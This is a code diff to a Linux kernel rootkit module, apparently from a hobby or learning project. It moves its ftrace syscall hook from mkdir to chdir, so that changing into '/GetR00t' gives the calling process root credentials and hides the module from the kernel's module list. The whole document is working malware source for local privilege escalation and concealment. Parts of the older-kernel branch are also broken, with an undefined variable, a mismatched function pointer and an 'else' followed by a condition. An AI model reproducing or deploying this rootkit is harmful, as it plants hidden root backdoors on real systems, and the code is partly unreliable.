@@ -262,27 +262,30 @@ static short hide = 0;
 #ifdef PTREGS_SYSCALL_STUBS
 //NEW WAY 
 
-static asmlinkage long (*orig_mkdir)(const struct pt_regs *);
+static asmlinkage long (*orig_chdir)(const struct pt_regs *);
 
-asmlinkage int fh_sys_mkdir(const struct pt_regs *regs)
+asmlinkage int fh_sys_chdir(const struct pt_regs *regs)
 {
     void set_root(void);
 	void showrootkit(void);
 
-	printk(KERN_INFO "Intercepting mkdir call");
+	printk(KERN_INFO "Intercepting chdir call");
+	
     
-    char __user *pathname = (char *)regs->di;
+    char __user *filename = (char *)regs->di;
     char dir[255] = {0};
 
-    long err = strncpy_from_user(dir, pathname, 255);
+    long err = strncpy_from_user(dir, filename, 254);
 
+	
     if (err > 0)
 		{
         printk(KERN_INFO "rootkit: trying to create directory with name: %s\n", dir);
 		}
+		
 
 
-    if ( (strcmp(dir, "GetR00t") == 0) && (hide == 0) )
+    if ( (strcmp(dir, "/GetR00t") == 0) && (hide == 0) )
         {
 			//execl(SHELL, "sh", NULL);
             printk(KERN_INFO "rootkit: giving root...\n");
@@ -290,7 +293,7 @@ asmlinkage int fh_sys_mkdir(const struct pt_regs *regs)
             return 0;
         }
 	
-	else if ( (strcmp(dir, "GetR00t") == 0) && (hide == 1) )
+	else if ( (strcmp(dir, "/GetR00t") == 0) && (hide == 1) )
         {
 			printk(KERN_INFO "showing rootkit \n");
 			showrootkit();
@@ -298,32 +301,31 @@ asmlinkage int fh_sys_mkdir(const struct pt_regs *regs)
             return 0;
         }
 
-	else
-		{
-			orig_mkdir(regs);
-			return 0;
-		}
+	printk(KERN_INFO "ORIGINAL CALL");
+	return orig_chdir(regs);
+	
+	
 }
 #else
-static asmlinkage long (*orig_mkdir)(const char __user *pathname, umode_t mode);
+static asmlinkage long sys_chdir(const char __user *filename);
 
-asmlinkage int fh_sys_mkdir(const char __user *pathname, umode_t mode)
+asmlinkage int fh_sys_chdir(const char __user *filename)
 {
     void set_root(void);
 	void showrootkit(void);
 
-	printk(KERN_INFO "Intercepting mkdir call (old way)");
+	printk(KERN_INFO "Intercepting chdir call (old way)");
 
     char dir[255] = {0};
 
-    long err = strncpy_from_user(dir, pathname, 255);
+    long err = strncpy_from_user(dir, filename, 254);
 
     if (error > 0)
 		{
         printk(KERN_INFO "rootkit: trying to create directory with name %s\n", dir);
 		}
 
-	if ( (strcmp(dir, "GetR00t") == 0) && (hide == 0) )
+	if ( (strcmp(dir, "/GetR00t") == 0) && (hide == 0) )
         {
 			//execl(SHELL, "sh", NULL);
             printk(KERN_INFO "rootkit: giving root...\n");
@@ -331,7 +333,7 @@ asmlinkage int fh_sys_mkdir(const char __user *pathname, umode_t mode)
             return 0;
         }
 
-	else if ( (strcmp(dir, "GetR00t") == 0) && (hide == 1) )
+	else ( (strcmp(dir, "/GetR00t") == 0) && (hide == 1) )
         {
 			printk(KERN_INFO "showing rootkit \n");
 			showrootkit();
@@ -339,13 +341,13 @@ asmlinkage int fh_sys_mkdir(const char __user *pathname, umode_t mode)
             return 0;
         }
 	
-    else
-		{
-			orig_mkdir(pathname, mode);
-			return 0;
-		}
+    
+	return orig_chdir(filename);
+		
 }
 #endif
+
+
 
 void set_root(void)
       {
@@ -353,6 +355,8 @@ void set_root(void)
 		   
 		   printk(KERN_INFO "set_root called");
 		   
+		   printk(KERN_INFO "The process is \"%s\" (pid %i)\n", current->comm, current->pid);
+
 		   struct cred *root;
            root = prepare_creds();
            
@@ -369,15 +373,19 @@ void set_root(void)
             root->suid.val = root->sgid.val = 0;
             root->fsuid.val = root->fsgid.val = 0;
 
+
            /* Set the credentials to root */
 		   printk(KERN_INFO "Commiting creds");
            commit_creds(root);
+		   
 		   
 		   /* Hide rootkit once root has been given */
 		   printk(KERN_INFO "Hiding rootkit \n");
 		   hiderootkit();
 		   hide = 1;
       }
+
+
 
 
 static struct list_head *prev_module;
@@ -394,70 +402,6 @@ void showrootkit(void)
 	list_add(&THIS_MODULE->list, prev_module);
 	}
 
-/*
-static char *duplicate_filename(const char __user *filename)
-{
-	char *kernel_filename;
-
-	kernel_filename = kmalloc(4096, GFP_KERNEL);
-	if (!kernel_filename)
-		return NULL;
-
-	if (strncpy_from_user(kernel_filename, filename, 4096) < 0) {
-		kfree(kernel_filename);
-		return NULL;
-	}
-
-	return kernel_filename;
-}
-
-
-#ifdef PTREGS_SYSCALL_STUBS
-static asmlinkage long (*real_sys_execve)(struct pt_regs *regs);
-
-static asmlinkage long fh_sys_execve(struct pt_regs *regs)
-{
-	long ret;
-	char *kernel_filename;
-
-	kernel_filename = duplicate_filename((void*) regs->di);
-
-	pr_info("execve() before: %s\n", kernel_filename);
-
-	kfree(kernel_filename);
-
-	ret = real_sys_execve(regs);
-
-	pr_info("execve() after: %ld\n", ret);
-
-	return ret;
-}
-#else
-static asmlinkage long (*real_sys_execve)(const char __user *filename,
-		const char __user *const __user *argv,
-		const char __user *const __user *envp);
-
-static asmlinkage long fh_sys_execve(const char __user *filename,
-		const char __user *const __user *argv,
-		const char __user *const __user *envp)
-{
-	long ret;
-	char *kernel_filename;
-
-	kernel_filename = duplicate_filename(filename);
-
-	pr_info("execve() before: %s\n", kernel_filename);
-
-	kfree(kernel_filename);
-
-	ret = real_sys_execve(filename, argv, envp);
-
-	pr_info("execve() after: %ld\n", ret);
-
-	return ret;
-}
-#endif
-*/
 
 
 /*
@@ -478,8 +422,7 @@ static asmlinkage long fh_sys_execve(const char __user *filename,
 	}
 
 static struct ftrace_hook demo_hooks[] = {
-	HOOK("sys_mkdir",  fh_sys_mkdir,  &orig_mkdir),
-	//HOOK("sys_execve", fh_sys_execve, &real_sys_execve),
+	HOOK("sys_chdir",  fh_sys_chdir,  &orig_chdir)
 };
 
 static int rootkit_init(void)
